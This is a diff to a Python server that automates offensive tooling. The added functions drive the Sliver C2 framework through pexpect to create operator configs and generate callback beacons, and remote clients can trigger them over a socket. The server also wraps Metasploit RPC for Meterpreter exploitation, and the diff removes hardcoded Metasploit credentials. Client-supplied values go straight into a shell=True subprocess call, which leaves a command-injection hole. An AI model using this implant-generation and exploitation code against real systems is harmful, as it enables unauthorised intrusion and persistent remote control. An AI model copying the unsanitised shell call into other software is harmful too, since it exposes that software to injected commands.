@@ -3,19 +3,67 @@ import time
 import socket
 import threading
 import subprocess
+import pexpect
 from socket_threading import Server
 import json
 from pymetasploit3.msfrpc import MsfRpcClient
 
 from socket_threading import RED, BLUE, GREEN, YELLOW, RESET
 
-MSF_HOST = "10.1.1.2"
-MSF_PORT = 1337
-MSF_PASSWORD = "memes"
-RESOURCE_SCRIPT = "/usr/src/metasploit-framework/docker/msfconsole.rc"
-
 server = None
 msfInstance = None
+
+def create_sliver_config(operator_name, lhost):
+    """Create Sliver Config file"""
+    print(f"{GREEN}=============== Create Sliver Config ==============={RESET}")
+    try:
+        sliver = pexpect.spawn("sliver-server", encoding = 'utf-8')
+        sliver.expect(r"sliver", timeout=30)
+        print(f"{GREEN}[+] Server Output: {RESET} {sliver.before}")
+
+        new_operator_cmd = f"new-operator --name {operator_name} --lhost {lhost}"
+        multiplayer_cmd = "multiplayer"
+
+        sliver.sendline(new_operator_cmd)
+        sliver.expect(r"sliver", timeout=30)
+        print(f"{GREEN}[+] Server Output: {RESET} {sliver.before}")
+
+        sliver.sendline(multiplayer_cmd)
+        sliver.expect(r"sliver", timeout=30)
+        print(f"{GREEN}[+] Server Output: {RESET} {sliver.before}")
+        print(f"{GREEN}[+] Successfully created Sliver Config file{RESET}")
+        return True
+    except Exception as e:
+        print(f"{RED}[!] Failed to create Sliver Config file: {e}")
+        return False
+
+def create_sliver_beacon(operator_name, lhost, seconds, jitter, http, os, arch, beacon_name):
+    """Create Sliver Beacon"""
+    print(f"{GREEN}=============== Connect Sliver Client ==============={RESET}")
+    try:
+        import_config_file_command = f"sliver-client import {operator_name}_{lhost}.cfg"
+        subprocess.run(import_config_file_command, shell = True, check = True)
+        
+        sliver = pexpect.spawn("sliver-client", encoding = 'utf-8')
+        sliver.expect(r"sliver", timeout=30)
+        print(f"{GREEN}[+] Client Output: {RESET} {sliver.before}")
+
+        beacon_creation_command = f"generate beacon --seconds {seconds} --jitter {jitter} --http {http} --os {os} --arch {arch} --name {beacon_name}"
+        http_command = "http"
+
+        sliver.sendline(beacon_creation_command)
+        sliver.expect(r"sliver", timeout=30)
+        print(f"{GREEN}[+] Client Output: {RESET} {sliver.before}")
+
+        sliver.sendline(http_command)
+        sliver.expect(r"sliver", timeout=30)
+        print(f"{GREEN}[+] Client Output: {RESET} {sliver.before}")
+        print(f"{GREEN}[+] Successfully created Sliver beacon{RESET}")
+        return True
+
+    except Exception as e:
+        print(f"{RED}[!] Failed to connect sliver-client to sliver-server: {e}")
+        return False
 
 def run_meterpreter_exploit(target_ip):
     """Execute a Meterpreter payload against the target."""
@@ -212,9 +260,35 @@ def handle_message(data, client_address):
     if not hasattr(handle_message, 'search_state'):
         handle_message.search_state = {}
     client_state = handle_message.search_state.setdefault(client_address, 
-                                                          {'keyword': None, 'start': 0, 'in_search': False, 'in_run': False, 'run_module': None})
+                                                          {'keyword': None, 'start': 0, 'in_search': False, 'in_run': False, 'run_module': None, 'config': False})
 
-    if command == "connect":
+    if command == "create_config":
+        if len(options) < 3:
+            response = f"{RED}[!] Invalid Sliver config creation command: create_config [operator_name] [lhost]{RESET}"
+        else: 
+            response = f"{BLUE}[+] Creating Sliver Config...{RESET}"
+            config = create_sliver_config(options[1], options[2])
+            if config:
+                response = f"{BLUE}[+] Created Sliver Config!{RESET}"
+                client_state['config'] = True
+            else:
+                response = f"{RED}[!] Sliver config creation failed!{RESET}"
+
+    elif command == "create_beacon": 
+        if len(options) < 9:
+            response = f"{RED}[!] Invalid Sliver Beacon Creation command: create_beacon [operator_name] [lhost] [seconds] [jitter] [http] [os] [arch] [beacon_name]{RESET}"
+        elif not client_state['config']:
+            response = f"{RED}[!] You must create a Sliver configuration file before creating a Sliver beacon{RESET}"
+        else:
+            response = f"{BLUE}[+] Creating Sliver Beacon...{RESET}"
+            beacon = create_sliver_beacon(options[1], options[2], options[3], options[4], options[5], options[6], options[7], options[8])
+            if beacon:
+                response = f"{BLUE}[+] Created Sliver Beacon!{RESET}"
+                client_state['beacon'] = True
+            else:
+                response = f"{RED}[!] Sliver beacon creation failed!{RESET}"
+
+    elif command == "connect":
         response = f"{BLUE}[+] Connecting to MSF...{RESET}"
         msfInstance = connect_msf()
         response = f"{BLUE}[+] Connected to Metasploit!{RESET}" if msfInstance else f"{RED}[-] Failed to connect to Metasploit{RESET}"
